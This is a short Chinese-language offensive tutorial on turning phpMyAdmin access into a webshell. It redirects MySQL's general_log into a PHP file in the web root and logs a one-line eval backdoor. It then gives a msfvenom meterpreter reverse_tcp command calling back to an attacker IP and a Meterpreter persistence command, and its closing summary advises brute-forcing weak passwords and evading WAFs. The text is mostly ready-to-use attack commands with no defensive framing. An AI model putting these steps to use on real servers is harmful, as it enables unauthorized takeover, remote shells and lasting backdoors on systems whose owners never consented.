# 利用phpmyadmin日志getshell

### 原理：

mysql 5.0版本以上会创建日志文件，全局变量genernal_log控制日志保存状态，开启它可以记录用户输入的每条命令；genernal_log_file变量值是保存日志文件的路径。

开启genernal_log后把genernal_log_file的值改为自定义的一个php文件中，然后通过log日志写入一句话后门，会被记录将其写入文件，即可getshell，需要有可读可写权限



### 1. 改变日志状态和日志文件及路径

```SQL
show variables like 'general%';	//查看日志状态
show variables like 'secure_file_priv'	//查看是否有写权限
select @@datadir;	//获取网站的绝对路径
set global general_log = "ON";
set global general_log_file='C:/phpstudy/WWW/shell.php';
set global general_log_file='/var/www/html/shell.php';
```

### 2. 查询一句话后门

```SQL
select '<?php eval($_POST[cmd]);?>';
```

### 3. 连接一句话

```http
192.168.1.12/shell.php
```

### 4. 提权及后渗透

用msf生成反弹木马，上传到目标服务器执行

```msf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -f exe > shell.exe
```

### 5. 建立后门

```msf
run persistence -S -U -X -i 5 -p 8888 -r 192.168.1.12
```



### 总结：

1. 通过爆破等方法找到phpmyadmin登录页面，使用弱口令爆破找到密码
2. 有可读可写权限
3. into outfile已被禁用，有WAF会被拦截
4. 采用SQL查询免杀shell的语句

